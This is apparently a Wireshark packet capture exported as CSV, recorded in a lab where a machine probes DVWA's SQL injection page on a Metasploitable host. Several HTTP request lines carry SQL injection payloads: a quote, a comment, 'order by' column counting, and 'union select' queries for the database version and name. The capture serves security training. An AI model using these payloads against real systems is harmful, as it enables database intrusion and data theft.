"No.","Time","Source","Destination","Protocol","Length","Info"
"1","0.000000000","10.0.2.5","34.149.100.209","TLSv1.2","100","Application Data"
"2","0.000220897","10.0.2.5","34.149.100.209","TLSv1.2","85","Encrypted Alert"
"3","0.000331259","34.149.100.209","10.0.2.5","TCP","60","443  >  34862 [ACK] Seq=1 Ack=79 Win=32172 Len=0"
"4","0.015726838","34.149.100.209","10.0.2.5","TCP","60","443  >  34862 [FIN, ACK] Seq=1 Ack=79 Win=32172 Len=0"
"5","0.015737053","10.0.2.5","34.149.100.209","TCP","54","34862  >  443 [ACK] Seq=79 Ack=2 Win=60532 Len=0"
"6","1.000711691","10.0.2.5","34.160.144.191","TLSv1.2","100","Application Data"
"7","1.001170227","10.0.2.5","34.160.144.191","TLSv1.2","85","Encrypted Alert"
"8","1.001745477","34.160.144.191","10.0.2.5","TCP","60","443  >  56406 [ACK] Seq=1 Ack=79 Win=31471 Len=0"
"9","1.015298503","34.160.144.191","10.0.2.5","TCP","60","443  >  56406 [FIN, ACK] Seq=1 Ack=79 Win=31471 Len=0"
"10","1.015309556","10.0.2.5","34.160.144.191","TCP","54","56406  >  443 [ACK] Seq=79 Ack=2 Win=30660 Len=0"
"11","8.617549052","10.0.2.4","10.0.2.5","TCP","66","80  >  41664 [FIN, ACK] Seq=1 Ack=1 Win=54 Len=0 TSval=26760 TSecr=3495261933"
"12","8.659116307","10.0.2.5","10.0.2.4","TCP","66","41664  >  80 [ACK] Seq=1 Ack=2 Win=249 Len=0 TSval=3495276971 TSecr=26760"
"13","22.517165153","10.0.2.5","10.0.2.4","TCP","74","51860  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495290829 TSecr=0 WS=128"
"14","22.517667991","10.0.2.4","10.0.2.5","TCP","74","80  >  51860 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=28149 TSecr=3495290829 WS=128"
"15","22.517707775","10.0.2.5","10.0.2.4","TCP","66","51860  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495290829 TSecr=28149"
"16","22.517832822","10.0.2.5","10.0.2.4","HTTP","566","GET /dvwa/vulnerabilities/sqli/?id=2&Submit=Submit HTTP/1.1 "
"17","22.518094454","10.0.2.4","10.0.2.5","TCP","66","80  >  51860 [ACK] Seq=1 Ack=501 Win=6912 Len=0 TSval=28149 TSecr=3495290830"
"18","22.526312123","10.0.2.4","10.0.2.5","TCP","4410","80  >  51860 [ACK] Seq=1 Ack=501 Win=6912 Len=4344 TSval=28150 TSecr=3495290830 [TCP segment of a reassembled PDU]"
"19","22.526356318","10.0.2.5","10.0.2.4","TCP","66","51860  >  80 [ACK] Seq=501 Ack=4345 Win=31872 Len=0 TSval=3495290838 TSecr=28150"
"20","22.526774069","10.0.2.4","10.0.2.5","HTTP","459","HTTP/1.1 200 OK  (text/html)"
"21","22.526796094","10.0.2.5","10.0.2.4","TCP","66","51860  >  80 [ACK] Seq=501 Ack=4738 Win=31872 Len=0 TSval=3495290839 TSecr=28150"
"22","27.145675572","10.0.2.5","10.0.2.4","TCP","74","53106  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495295457 TSecr=0 WS=128"
"23","27.146322861","10.0.2.4","10.0.2.5","TCP","74","80  >  53106 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=28612 TSecr=3495295457 WS=128"
"24","27.146360113","10.0.2.5","10.0.2.4","TCP","66","53106  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495295458 TSecr=28612"
"25","27.146947721","10.0.2.5","10.0.2.4","HTTP","566","GET /dvwa/vulnerabilities/sqli/?id=2&Submit=Submit HTTP/1.1 "
"26","27.147415406","10.0.2.4","10.0.2.5","TCP","66","80  >  53106 [ACK] Seq=1 Ack=501 Win=6912 Len=0 TSval=28612 TSecr=3495295459"
"27","27.154509721","10.0.2.4","10.0.2.5","TCP","2962","80  >  53106 [ACK] Seq=1 Ack=501 Win=6912 Len=2896 TSval=28613 TSecr=3495295459 [TCP segment of a reassembled PDU]"
"28","27.154542944","10.0.2.5","10.0.2.4","TCP","66","53106  >  80 [ACK] Seq=501 Ack=2897 Win=31872 Len=0 TSval=3495295466 TSecr=28613"
"29","27.154737007","10.0.2.4","10.0.2.5","TCP","1514","80  >  53106 [ACK] Seq=2897 Ack=501 Win=6912 Len=1448 TSval=28613 TSecr=3495295459 [TCP segment of a reassembled PDU]"
"30","27.154740283","10.0.2.5","10.0.2.4","TCP","66","53106  >  80 [ACK] Seq=501 Ack=4345 Win=31872 Len=0 TSval=3495295467 TSecr=28613"
"31","27.154881597","10.0.2.4","10.0.2.5","HTTP","459","HTTP/1.1 200 OK  (text/html)"
"32","27.154883246","10.0.2.5","10.0.2.4","TCP","66","53106  >  80 [ACK] Seq=501 Ack=4738 Win=31872 Len=0 TSval=3495295467 TSecr=28613"
"33","27.155234095","10.0.2.5","10.0.2.4","TCP","66","53106  >  80 [FIN, ACK] Seq=501 Ack=4738 Win=31872 Len=0 TSval=3495295467 TSecr=28613"
"34","27.155697649","10.0.2.4","10.0.2.5","TCP","66","80  >  53106 [FIN, ACK] Seq=4738 Ack=502 Win=6912 Len=0 TSval=28613 TSecr=3495295467"
"35","27.155703853","10.0.2.5","10.0.2.4","TCP","66","53106  >  80 [ACK] Seq=502 Ack=4739 Win=31872 Len=0 TSval=3495295468 TSecr=28613"
"36","32.611118003","10.0.2.5","34.117.121.53","TLSv1.2","100","Application Data"
"37","32.612008750","10.0.2.5","34.117.121.53","TLSv1.2","85","Encrypted Alert"
"38","32.612153739","10.0.2.5","34.117.121.53","TCP","54","51948  >  443 [FIN, ACK] Seq=78 Ack=1 Win=65535 Len=0"
"39","32.612448636","34.117.121.53","10.0.2.5","TCP","60","443  >  51948 [ACK] Seq=1 Ack=78 Win=32387 Len=0"
"40","32.612921879","34.117.121.53","10.0.2.5","TCP","60","443  >  51948 [ACK] Seq=1 Ack=79 Win=32386 Len=0"
"41","32.625967468","34.117.121.53","10.0.2.5","TCP","60","443  >  51948 [FIN, ACK] Seq=1 Ack=79 Win=32386 Len=0"
"42","32.625991687","10.0.2.5","34.117.121.53","TCP","54","51948  >  443 [ACK] Seq=79 Ack=2 Win=3740 Len=0"
"43","32.841645776","10.0.2.5","10.0.2.4","TCP","66","51860  >  80 [FIN, ACK] Seq=501 Ack=4738 Win=31872 Len=0 TSval=3495301153 TSecr=28150"
"44","32.841828078","10.0.2.5","10.0.2.4","TCP","66","41664  >  80 [FIN, ACK] Seq=1 Ack=2 Win=249 Len=0 TSval=3495301154 TSecr=26760"
"45","32.841937371","10.0.2.5","10.0.2.4","TCP","66","58554  >  80 [FIN, ACK] Seq=1 Ack=1 Win=249 Len=0 TSval=3495301154 TSecr=24105"
"46","32.842023222","10.0.2.4","10.0.2.5","TCP","66","80  >  41664 [ACK] Seq=2 Ack=2 Win=54 Len=0 TSval=29181 TSecr=3495301154"
"47","32.842079047","10.0.2.5","10.0.2.4","TCP","66","40804  >  80 [FIN, ACK] Seq=1 Ack=1 Win=249 Len=0 TSval=3495301154 TSecr=23436"
"48","32.842160954","10.0.2.4","10.0.2.5","TCP","66","80  >  58554 [ACK] Seq=1 Ack=2 Win=64 Len=0 TSval=29181 TSecr=3495301154"
"49","32.842331890","10.0.2.4","10.0.2.5","TCP","66","80  >  40804 [ACK] Seq=1 Ack=2 Win=62 Len=0 TSval=29181 TSecr=3495301154"
"50","32.842331925","10.0.2.4","10.0.2.5","TCP","66","80  >  51860 [FIN, ACK] Seq=4738 Ack=502 Win=6912 Len=0 TSval=29181 TSecr=3495301153"
"51","32.842339121","10.0.2.5","10.0.2.4","TCP","66","51860  >  80 [ACK] Seq=502 Ack=4739 Win=31872 Len=0 TSval=3495301154 TSecr=29181"
"52","33.772368641","10.0.2.5","10.0.2.4","TCP","74","53120  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495302084 TSecr=0 WS=128"
"53","33.772771342","10.0.2.4","10.0.2.5","TCP","74","80  >  53120 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=29274 TSecr=3495302084 WS=128"
"54","33.772803672","10.0.2.5","10.0.2.4","TCP","66","53120  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495302085 TSecr=29274"
"55","33.773597564","10.0.2.5","10.0.2.4","HTTP","567","GET /dvwa/vulnerabilities/sqli/?id=2'&Submit=Submit HTTP/1.1 "
"56","33.774200589","10.0.2.4","10.0.2.5","TCP","66","80  >  53120 [ACK] Seq=1 Ack=502 Win=6912 Len=0 TSval=29275 TSecr=3495302085"
"57","33.781344900","10.0.2.4","10.0.2.5","HTTP","597","HTTP/1.1 200 OK  (text/html)"
"58","33.781374267","10.0.2.5","10.0.2.4","TCP","66","53120  >  80 [ACK] Seq=502 Ack=532 Win=31872 Len=0 TSval=3495302093 TSecr=29275"
"59","34.784156660","10.0.2.5","10.0.2.4","TCP","66","53120  >  80 [FIN, ACK] Seq=502 Ack=532 Win=31872 Len=0 TSval=3495303096 TSecr=29275"
"60","34.784727130","10.0.2.4","10.0.2.5","TCP","66","80  >  53120 [FIN, ACK] Seq=532 Ack=503 Win=6912 Len=0 TSval=29376 TSecr=3495303096"
"61","34.784755409","10.0.2.5","10.0.2.4","TCP","66","53120  >  80 [ACK] Seq=503 Ack=533 Win=31872 Len=0 TSval=3495303097 TSecr=29376"
"62","37.683723174","PcsCompu_c9:93:64","RealtekU_12:35:00","ARP","42","Who has 10.0.2.1? Tell 10.0.2.5"
"63","37.683947876","RealtekU_12:35:00","PcsCompu_c9:93:64","ARP","60","10.0.2.1 is at 52:54:00:12:35:00"
"64","39.506573993","10.0.2.5","10.0.2.4","TCP","74","59422  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495307818 TSecr=0 WS=128"
"65","39.507220403","10.0.2.4","10.0.2.5","TCP","74","80  >  59422 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=29848 TSecr=3495307818 WS=128"
"66","39.507326034","10.0.2.5","10.0.2.4","TCP","66","59422  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495307819 TSecr=29848"
"67","39.507560249","10.0.2.5","10.0.2.4","HTTP","570","GET /dvwa/vulnerabilities/sqli/?id=2'--+&Submit=Submit HTTP/1.1 "
"68","39.507991336","10.0.2.4","10.0.2.5","TCP","66","80  >  59422 [ACK] Seq=1 Ack=505 Win=6912 Len=0 TSval=29848 TSecr=3495307819"
"69","39.515109910","10.0.2.4","10.0.2.5","TCP","2962","80  >  59422 [ACK] Seq=1 Ack=505 Win=6912 Len=2896 TSval=29849 TSecr=3495307819 [TCP segment of a reassembled PDU]"
"70","39.515135567","10.0.2.5","10.0.2.4","TCP","66","59422  >  80 [ACK] Seq=505 Ack=2897 Win=31872 Len=0 TSval=3495307827 TSecr=29849"
"71","39.515271835","10.0.2.4","10.0.2.5","TCP","1514","80  >  59422 [ACK] Seq=2897 Ack=505 Win=6912 Len=1448 TSval=29849 TSecr=3495307819 [TCP segment of a reassembled PDU]"
"72","39.515274500","10.0.2.5","10.0.2.4","TCP","66","59422  >  80 [ACK] Seq=505 Ack=4345 Win=31872 Len=0 TSval=3495307827 TSecr=29849"
"73","39.515530139","10.0.2.4","10.0.2.5","HTTP","463","HTTP/1.1 200 OK  (text/html)"
"74","39.515531983","10.0.2.5","10.0.2.4","TCP","66","59422  >  80 [ACK] Seq=505 Ack=4742 Win=31872 Len=0 TSval=3495307827 TSecr=29849"
"75","39.516338491","10.0.2.5","10.0.2.4","TCP","66","59422  >  80 [FIN, ACK] Seq=505 Ack=4742 Win=31872 Len=0 TSval=3495307828 TSecr=29849"
"76","39.516820231","10.0.2.4","10.0.2.5","TCP","66","80  >  59422 [FIN, ACK] Seq=4742 Ack=506 Win=6912 Len=0 TSval=29849 TSecr=3495307828"
"77","39.516829720","10.0.2.5","10.0.2.4","TCP","66","59422  >  80 [ACK] Seq=506 Ack=4743 Win=31872 Len=0 TSval=3495307829 TSecr=29849"
"78","47.697425676","10.0.2.4","10.0.2.255","BROWSER","286","Local Master Announcement METASPLOITABLE, Workstation, Server, Print Queue Server, Xenix Server, NT Workstation, NT Server, Master Browser"
"79","47.697707934","10.0.2.4","10.0.2.255","BROWSER","257","Domain/Workgroup Announcement WORKGROUP, NT Workstation, Domain Enum"
"80","48.954666375","10.0.2.5","10.0.2.4","TCP","74","60472  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495317266 TSecr=0 WS=128"
"81","48.955257521","10.0.2.4","10.0.2.5","TCP","74","80  >  60472 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=30792 TSecr=3495317266 WS=128"
"82","48.955286343","10.0.2.5","10.0.2.4","TCP","66","60472  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495317267 TSecr=30792"
"83","48.955445527","10.0.2.5","10.0.2.4","HTTP","581","GET /dvwa/vulnerabilities/sqli/?id=2'+order+by+1--+&Submit=Submit HTTP/1.1 "
"84","48.955823783","10.0.2.4","10.0.2.5","TCP","66","80  >  60472 [ACK] Seq=1 Ack=516 Win=6912 Len=0 TSval=30792 TSecr=3495317267"
"85","48.963282949","10.0.2.4","10.0.2.5","TCP","4410","80  >  60472 [ACK] Seq=1 Ack=516 Win=6912 Len=4344 TSval=30793 TSecr=3495317267 [TCP segment of a reassembled PDU]"
"86","48.963296957","10.0.2.5","10.0.2.4","TCP","66","60472  >  80 [ACK] Seq=516 Ack=4345 Win=31872 Len=0 TSval=3495317275 TSecr=30793"
"87","48.963577537","10.0.2.4","10.0.2.5","HTTP","474","HTTP/1.1 200 OK  (text/html)"
"88","48.963579919","10.0.2.5","10.0.2.4","TCP","66","60472  >  80 [ACK] Seq=516 Ack=4753 Win=31872 Len=0 TSval=3495317275 TSecr=30793"
"89","48.964249706","10.0.2.5","10.0.2.4","TCP","66","60472  >  80 [FIN, ACK] Seq=516 Ack=4753 Win=31872 Len=0 TSval=3495317276 TSecr=30793"
"90","48.964616108","10.0.2.4","10.0.2.5","TCP","66","80  >  60472 [FIN, ACK] Seq=4753 Ack=517 Win=6912 Len=0 TSval=30793 TSecr=3495317276"
"91","48.964623341","10.0.2.5","10.0.2.4","TCP","66","60472  >  80 [ACK] Seq=517 Ack=4754 Win=31872 Len=0 TSval=3495317276 TSecr=30793"
"92","53.264604766","10.0.2.5","10.0.2.4","TCP","74","60474  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495321576 TSecr=0 WS=128"
"93","53.265252563","10.0.2.4","10.0.2.5","TCP","74","80  >  60474 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=31223 TSecr=3495321576 WS=128"
"94","53.265271722","10.0.2.5","10.0.2.4","TCP","66","60474  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495321577 TSecr=31223"
"95","53.265895179","10.0.2.5","10.0.2.4","HTTP","581","GET /dvwa/vulnerabilities/sqli/?id=2'+order+by+2--+&Submit=Submit HTTP/1.1 "
"96","53.266362146","10.0.2.4","10.0.2.5","TCP","66","80  >  60474 [ACK] Seq=1 Ack=516 Win=6912 Len=0 TSval=31223 TSecr=3495321578"
"97","53.273860103","10.0.2.4","10.0.2.5","TCP","4410","80  >  60474 [ACK] Seq=1 Ack=516 Win=6912 Len=4344 TSval=31224 TSecr=3495321578 [TCP segment of a reassembled PDU]"
"98","53.273868782","10.0.2.5","10.0.2.4","TCP","66","60474  >  80 [ACK] Seq=516 Ack=4345 Win=31872 Len=0 TSval=3495321586 TSecr=31224"
"99","53.274403608","10.0.2.4","10.0.2.5","HTTP","474","HTTP/1.1 200 OK  (text/html)"
"100","53.274408621","10.0.2.5","10.0.2.4","TCP","66","60474  >  80 [ACK] Seq=516 Ack=4753 Win=31872 Len=0 TSval=3495321586 TSecr=31224"
"101","53.278263126","10.0.2.5","10.0.2.4","TCP","66","60474  >  80 [FIN, ACK] Seq=516 Ack=4753 Win=31872 Len=0 TSval=3495321590 TSecr=31224"
"102","53.278903424","10.0.2.4","10.0.2.5","TCP","66","80  >  60474 [FIN, ACK] Seq=4753 Ack=517 Win=6912 Len=0 TSval=31225 TSecr=3495321590"
"103","53.278911154","10.0.2.5","10.0.2.4","TCP","66","60474  >  80 [ACK] Seq=517 Ack=4754 Win=31872 Len=0 TSval=3495321591 TSecr=31225"
"104","56.655183530","10.0.2.5","10.0.2.4","TCP","74","56858  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495324967 TSecr=0 WS=128"
"105","56.655778179","10.0.2.4","10.0.2.5","TCP","74","80  >  56858 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=31562 TSecr=3495324967 WS=128"
"106","56.655815612","10.0.2.5","10.0.2.4","TCP","66","56858  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495324968 TSecr=31562"
"107","56.657484462","10.0.2.5","10.0.2.4","HTTP","581","GET /dvwa/vulnerabilities/sqli/?id=2'+order+by+3--+&Submit=Submit HTTP/1.1 "
"108","56.658066041","10.0.2.4","10.0.2.5","TCP","66","80  >  56858 [ACK] Seq=1 Ack=516 Win=6912 Len=0 TSval=31562 TSecr=3495324969"
"109","56.671469883","10.0.2.4","10.0.2.5","HTTP","482","HTTP/1.1 200 OK  (text/html)"
"110","56.671477377","10.0.2.5","10.0.2.4","TCP","66","56858  >  80 [ACK] Seq=516 Ack=417 Win=31872 Len=0 TSval=3495324983 TSecr=31563"
"111","57.673126597","10.0.2.5","10.0.2.4","TCP","66","56858  >  80 [FIN, ACK] Seq=516 Ack=417 Win=31872 Len=0 TSval=3495325985 TSecr=31563"
"112","57.674352758","10.0.2.4","10.0.2.5","TCP","66","80  >  56858 [FIN, ACK] Seq=417 Ack=517 Win=6912 Len=0 TSval=31664 TSecr=3495325985"
"113","57.674373655","10.0.2.5","10.0.2.4","TCP","66","56858  >  80 [ACK] Seq=517 Ack=418 Win=31872 Len=0 TSval=3495325986 TSecr=31664"
"114","61.983234635","10.0.2.5","10.0.2.3","DHCP","324","DHCP Request  - Transaction ID 0xf91ce60f"
"115","61.991564584","10.0.2.3","10.0.2.5","DHCP","590","DHCP ACK      - Transaction ID 0xf91ce60f"
"116","67.122775447","PcsCompu_c9:93:64","PcsCompu_cc:77:b6","ARP","42","Who has 10.0.2.3? Tell 10.0.2.5"
"117","67.122967619","PcsCompu_cc:77:b6","PcsCompu_c9:93:64","ARP","60","10.0.2.3 is at 08:00:27:cc:77:b6"
"118","69.031296878","10.0.2.5","10.0.2.4","TCP","74","52290  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495337343 TSecr=0 WS=128"
"119","69.031890864","10.0.2.4","10.0.2.5","TCP","74","80  >  52290 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=32799 TSecr=3495337343 WS=128"
"120","69.031902975","10.0.2.5","10.0.2.4","TCP","66","52290  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495337344 TSecr=32799"
"121","69.032476842","10.0.2.5","10.0.2.4","HTTP","587","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+1,2--+&Submit=Submit HTTP/1.1 "
"122","69.033034024","10.0.2.4","10.0.2.5","TCP","66","80  >  52290 [ACK] Seq=1 Ack=522 Win=6912 Len=0 TSval=32800 TSecr=3495337344"
"123","69.040710495","10.0.2.4","10.0.2.5","TCP","2962","80  >  52290 [ACK] Seq=1 Ack=522 Win=6912 Len=2896 TSval=32800 TSecr=3495337344 [TCP segment of a reassembled PDU]"
"124","69.040728576","10.0.2.5","10.0.2.4","TCP","66","52290  >  80 [ACK] Seq=522 Ack=2897 Win=31872 Len=0 TSval=3495337353 TSecr=32800"
"125","69.040880574","10.0.2.4","10.0.2.5","TCP","1514","80  >  52290 [ACK] Seq=2897 Ack=522 Win=6912 Len=1448 TSval=32800 TSecr=3495337344 [TCP segment of a reassembled PDU]"
"126","69.040883857","10.0.2.5","10.0.2.4","TCP","66","52290  >  80 [ACK] Seq=522 Ack=4345 Win=31872 Len=0 TSval=3495337353 TSecr=32800"
"127","69.041143240","10.0.2.4","10.0.2.5","HTTP","548","HTTP/1.1 200 OK  (text/html)"
"128","69.041145155","10.0.2.5","10.0.2.4","TCP","66","52290  >  80 [ACK] Seq=522 Ack=4827 Win=31872 Len=0 TSval=3495337353 TSecr=32800"
"129","69.043771971","10.0.2.5","10.0.2.4","TCP","66","52290  >  80 [FIN, ACK] Seq=522 Ack=4827 Win=31872 Len=0 TSval=3495337356 TSecr=32800"
"130","69.044294022","10.0.2.4","10.0.2.5","TCP","66","80  >  52290 [FIN, ACK] Seq=4827 Ack=523 Win=6912 Len=0 TSval=32801 TSecr=3495337356"
"131","69.044312174","10.0.2.5","10.0.2.4","TCP","66","52290  >  80 [ACK] Seq=523 Ack=4828 Win=31872 Len=0 TSval=3495337356 TSecr=32801"
"132","117.784456256","34.107.243.93","10.0.2.5","TLSv1.2","78","Application Data"
"133","117.784574570","10.0.2.5","34.107.243.93","TCP","54","57910  >  443 [ACK] Seq=1 Ack=25 Win=31616 Len=0"
"134","117.785042555","10.0.2.5","34.107.243.93","TLSv1.2","82","Application Data"
"135","117.943116103","34.107.243.93","10.0.2.5","TCP","60","443  >  57910 [ACK] Seq=25 Ack=29 Win=32606 Len=0"
"136","122.931166137","PcsCompu_c9:93:64","RealtekU_12:35:00","ARP","42","Who has 10.0.2.1? Tell 10.0.2.5"
"137","122.931385482","RealtekU_12:35:00","PcsCompu_c9:93:64","ARP","60","10.0.2.1 is at 52:54:00:12:35:00"
"138","140.256051300","10.0.2.5","10.0.2.4","TCP","74","35960  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495408568 TSecr=0 WS=128"
"139","140.256674175","10.0.2.4","10.0.2.5","TCP","74","80  >  35960 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=39920 TSecr=3495408568 WS=128"
"140","140.256706305","10.0.2.5","10.0.2.4","TCP","66","35960  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495408568 TSecr=39920"
"141","140.257524086","10.0.2.5","10.0.2.4","HTTP","595","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+@@version,2--+&Submit=Submit HTTP/1.1 "
"142","140.257981441","10.0.2.4","10.0.2.5","TCP","66","80  >  35960 [ACK] Seq=1 Ack=530 Win=6912 Len=0 TSval=39920 TSecr=3495408569"
"143","140.266167104","10.0.2.4","10.0.2.5","TCP","2962","80  >  35960 [ACK] Seq=1 Ack=530 Win=6912 Len=2896 TSval=39921 TSecr=3495408569 [TCP segment of a reassembled PDU]"
"144","140.266194594","10.0.2.5","10.0.2.4","TCP","66","35960  >  80 [ACK] Seq=530 Ack=2897 Win=31872 Len=0 TSval=3495408578 TSecr=39921"
"145","140.266374865","10.0.2.4","10.0.2.5","TCP","1514","80  >  35960 [ACK] Seq=2897 Ack=530 Win=6912 Len=1448 TSval=39921 TSecr=3495408569 [TCP segment of a reassembled PDU]"
"146","140.266377762","10.0.2.5","10.0.2.4","TCP","66","35960  >  80 [ACK] Seq=530 Ack=4345 Win=31872 Len=0 TSval=3495408578 TSecr=39921"
"147","140.266738041","10.0.2.4","10.0.2.5","HTTP","579","HTTP/1.1 200 OK  (text/html)"
"148","140.266739812","10.0.2.5","10.0.2.4","TCP","66","35960  >  80 [ACK] Seq=530 Ack=4858 Win=31872 Len=0 TSval=3495408579 TSecr=39921"
"149","140.269052272","10.0.2.5","10.0.2.4","TCP","66","35960  >  80 [FIN, ACK] Seq=530 Ack=4858 Win=31872 Len=0 TSval=3495408581 TSecr=39921"
"150","140.269669809","10.0.2.4","10.0.2.5","TCP","66","80  >  35960 [FIN, ACK] Seq=4858 Ack=531 Win=6912 Len=0 TSval=39922 TSecr=3495408581"
"151","140.269677022","10.0.2.5","10.0.2.4","TCP","66","35960  >  80 [ACK] Seq=531 Ack=4859 Win=31872 Len=0 TSval=3495408581 TSecr=39922"
"152","145.459853996","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"153","145.460466647","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"154","200.007609664","10.0.2.5","10.0.2.4","TCP","74","47016  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495468319 TSecr=0 WS=128"
"155","200.008151905","10.0.2.4","10.0.2.5","TCP","74","80  >  47016 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=45894 TSecr=3495468319 WS=128"
"156","200.008180860","10.0.2.5","10.0.2.4","TCP","66","47016  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495468320 TSecr=45894"
"157","200.010521062","10.0.2.5","10.0.2.4","HTTP","594","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+@@dbname,2--+&Submit=Submit HTTP/1.1 "
"158","200.011009032","10.0.2.4","10.0.2.5","TCP","66","80  >  47016 [ACK] Seq=1 Ack=529 Win=6912 Len=0 TSval=45894 TSecr=3495468322"
"159","200.018912920","10.0.2.4","10.0.2.5","HTTP","478","HTTP/1.1 200 OK  (text/html)"
"160","200.018942658","10.0.2.5","10.0.2.4","TCP","66","47016  >  80 [ACK] Seq=529 Ack=413 Win=31872 Len=0 TSval=3495468331 TSecr=45895"
"161","201.021551126","10.0.2.5","10.0.2.4","TCP","66","47016  >  80 [FIN, ACK] Seq=529 Ack=413 Win=31872 Len=0 TSval=3495469333 TSecr=45895"
"162","201.022234186","10.0.2.4","10.0.2.5","TCP","66","80  >  47016 [FIN, ACK] Seq=413 Ack=530 Win=6912 Len=0 TSval=45995 TSecr=3495469333"
"163","201.022263961","10.0.2.5","10.0.2.4","TCP","66","47016  >  80 [ACK] Seq=530 Ack=414 Win=31872 Len=0 TSval=3495469334 TSecr=45995"
"164","231.677339139","10.0.2.5","10.0.2.4","TCP","74","55216  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495499989 TSecr=0 WS=128"
"165","231.677961276","10.0.2.4","10.0.2.5","TCP","74","80  >  55216 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=49060 TSecr=3495499989 WS=128"
"166","231.677973708","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495499990 TSecr=49060"
"167","231.679436992","10.0.2.5","10.0.2.4","HTTP","587","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+1,2--+&Submit=Submit HTTP/1.1 "
"168","231.679930736","10.0.2.4","10.0.2.5","TCP","66","80  >  55216 [ACK] Seq=1 Ack=522 Win=6912 Len=0 TSval=49060 TSecr=3495499991"
"169","231.687502688","10.0.2.4","10.0.2.5","TCP","4410","80  >  55216 [ACK] Seq=1 Ack=522 Win=6912 Len=4344 TSval=49061 TSecr=3495499991 [TCP segment of a reassembled PDU]"
"170","231.687510448","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [ACK] Seq=522 Ack=4345 Win=31872 Len=0 TSval=3495499999 TSecr=49061"
"171","231.687991474","10.0.2.4","10.0.2.5","HTTP","548","HTTP/1.1 200 OK  (text/html)"
"172","231.687995985","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [ACK] Seq=522 Ack=4827 Win=31872 Len=0 TSval=3495500000 TSecr=49061"
"173","231.689123825","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [FIN, ACK] Seq=522 Ack=4827 Win=31872 Len=0 TSval=3495500001 TSecr=49061"
"174","231.689814654","10.0.2.4","10.0.2.5","TCP","66","80  >  55216 [FIN, ACK] Seq=4827 Ack=523 Win=6912 Len=0 TSval=49061 TSecr=3495500001"
"175","231.689819938","10.0.2.5","10.0.2.4","TCP","66","55216  >  80 [ACK] Seq=523 Ack=4828 Win=31872 Len=0 TSval=3495500002 TSecr=49061"
"176","239.586473143","10.0.2.5","10.0.2.4","TCP","74","40524  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495507898 TSecr=0 WS=128"
"177","239.587115957","10.0.2.4","10.0.2.5","TCP","74","80  >  40524 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=49851 TSecr=3495507898 WS=128"
"178","239.587128842","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495507899 TSecr=49851"
"179","239.588327335","10.0.2.5","10.0.2.4","HTTP","595","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+'testing',2--+&Submit=Submit HTTP/1.1 "
"180","239.588949897","10.0.2.4","10.0.2.5","TCP","66","80  >  40524 [ACK] Seq=1 Ack=530 Win=6912 Len=0 TSval=49851 TSecr=3495507900"
